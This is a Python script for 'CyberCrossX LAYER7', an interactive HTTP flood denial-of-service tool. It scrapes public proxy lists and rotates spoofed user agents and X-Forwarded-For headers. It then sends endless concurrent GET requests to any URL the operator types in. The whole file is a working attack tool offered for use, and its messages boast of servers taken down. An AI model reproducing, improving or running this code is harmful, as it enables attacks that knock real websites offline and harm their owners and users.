import random
import aiohttp
import asyncio
import requests
import sys
import os
import re

CyberCrossX = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"
cyan = "\033[96m"

user_agent = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
    "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)",

    # Chrome terbaru
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36",

    # Opera terbaru
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36 OPR/100.0.4815.54",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 OPR/99.0.4785.66",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36 OPR/98.0.4759.81",

    # Mozilla Firefox terbaru
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",

    # Safari terbaru (macOS & iOS)
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
]


proxysite = [
    # --- Proxy Lists Umum ---
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.proxynova.com/proxy-server-list/",
    "https://www.proxy-list.download/",
    "https://proxy-daily.com/",
    "https://proxylist.geonode.com/free-proxy-list",
    "https://proxydb.net/",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.hide-my-ip.com/proxylist.shtml",
    "https://www.my-proxy.com/free-proxy-list.html",
    "https://www.spys.one/en/free-proxy-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://openproxy.space/list",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",

    # --- Khusus SOCKS5 & Anonim ---
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5",
    "https://www.socks-proxy.net/",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",

    # --- API/Open Scraper-Friendly ---
    "https://proxyscrape.com/api?request=displayproxies&proxytype=http&timeout=10000&ssl=all&anonymity=all",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000"
]

def proxylist(url):
    proxies = []
    try:
        response = requests.get(url, timeout=5)
        proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
        proxies.extend(proxy_list)
    except Exception as e:
        print(f"[CyberCrossX] {e}")
    return proxies

all_proxies = []
for site in proxysite:
    proxies = proxylist(site)
    all_proxies.extend(proxies)

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{CyberCrossX}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝ 
███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║  
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝ {clear}
               
╔═════════════════════════════════════════════════════╗
║ {CyberCrossX}*{clear} version   {CyberCrossX}:{clear}   4.0                                 ║
║ {CyberCrossX}*{clear} CyberCrossX      {CyberCrossX}:{clear}  {CyberCrossX}[{clear}{white}LAYER7{clear}{CyberCrossX}]{clear}                             ║  
╚═════════════════════════════════════════════════════╝
               
╔═════════════════════════════════════════════════════╗
║ {CyberCrossX}[{clear}1{CyberCrossX}]{clear} HTTP Flood Attack                               ║
║ {CyberCrossX}[{clear}2{CyberCrossX}]{clear} HTTP Flood Attack {CyberCrossX}[{clear}{white}PROXY{clear}{CyberCrossX}]{clear}                       ║                       
║ {CyberCrossX}[{clear}3{CyberCrossX}]{clear} Exit CyberCrossX                                       ║                                 
╚═════════════════════════════════════════════════════╝           
""")

def layer7():
    while True:
        logo()
        select = input(f"""
╔═══[{CyberCrossX}root{clear}@{CyberCrossX}CyberCrossX{clear}]
╚══{CyberCrossX}>{clear} """)
                                        
        if select == "1" or select.lower() == "1":
            async def send_request(session, url, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                }
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{CyberCrossX}CyberCrossX{clear}] Url {CyberCrossX}:{clear} {url} {CyberCrossX}|{clear} Status {CyberCrossX}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, retries - 1)

            async def send_requests(url, threads):
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    while True: 
                        tasks = [send_request(session, url) for _ in range(threads)] 
                        await asyncio.gather(*tasks)  

            async def start_threads(url, threads):
                tasks = []
                for _ in range(threads):
                    task = asyncio.create_task(send_requests(url, threads))
                    tasks.append(task)

                await asyncio.gather(*tasks)

            url = input(f"[{CyberCrossX}CyberCrossX{clear}] URL     {CyberCrossX}>{clear} ")
            threads = int(input(f"[{CyberCrossX}CyberCrossX{clear}] THREAD     {CyberCrossX}>{clear} "))
            print(f"[{CyberCrossX}CyberCrossX{clear}] {url}")
            asyncio.run(start_threads(url, threads))


        elif select == "2" or select.lower() == "2":
            async def send_request(session, url, proxy, retries=3):
                headers = {
                    "User-Agent": random.choice(user_agent),
                    "X-Forwarded-For": proxy, 
                }
                
                try:
                    async with session.get(url, headers=headers) as response:
                        print(f"[{CyberCrossX}CyberCrossX{clear}] Url {CyberCrossX}:{clear} {CyberCrossX}{proxy}{clear} {CyberCrossX}>{clear} {url} {CyberCrossX}|{clear} Status {CyberCrossX}:{clear} {red}{response.status}{clear}")
                except aiohttp.ClientConnectorError:
                    print(f"[{red}-{clear}] {red}Server has down by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except aiohttp.ServerDisconnectedError:
                    print(f"[{red}-{clear}] {red}Server has disconnected by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)
                except asyncio.TimeoutError:
                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by CyberCrossX !!{clear}")
                    if retries > 0:
                        await asyncio.sleep(2)
                        await send_request(session, url, proxy, retries - 1)

            async def send_requests(url, proxy_list, threads):
                async with aiohttp.ClientSession() as session:
                    while True:
                        tasks = [
                            send_request(session, url, random.choice(proxy_list)) for _ in range(threads)
                        ]
                        await asyncio.gather(*tasks)

            async def start_threads(url, proxy_list, threads):
                tasks = []
                for _ in range(threads):
                    task = asyncio.create_task(send_requests(url, proxy_list, threads))  
                    tasks.append(task)

                await asyncio.gather(*tasks)

            url = input(f"[{CyberCrossX}CyberCrossX{clear}] URL     {CyberCrossX}>{clear} ")
            threads = int(input(f"[{CyberCrossX}CyberCrossX{clear}] THREAD     {CyberCrossX}>{clear} "))
            print(f"[{CyberCrossX}CyberCrossX{clear}] {url}")
            asyncio.run(start_threads(url, all_proxies, threads)) 


        elif select == "3" or select.lower() == "3": 
            sys.exit()


if __name__ == "__main__":
    layer7()





